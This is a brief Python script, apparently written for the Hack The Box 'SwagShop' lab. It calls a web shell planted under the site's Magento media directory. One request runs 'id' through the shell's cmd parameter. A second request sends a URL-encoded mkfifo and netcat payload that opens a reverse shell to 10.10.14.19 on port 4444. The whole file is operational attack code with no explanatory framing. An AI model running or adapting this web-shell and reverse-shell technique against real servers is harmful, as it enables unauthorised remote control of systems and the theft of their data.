import requests


url1 = "http://swagshop.htb/media/custom_options/quote/f/i/48e27235e3989227f6b26639439e9d6d.phtml?cmd=id"

url = "http://swagshop.htb/media/custom_options/quote/f/i/48e27235e3989227f6b26639439e9d6d.phtml?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.19%204444%20%3E%2Ftmp%2Ff"


r = requests.get(url)

print(r.text)
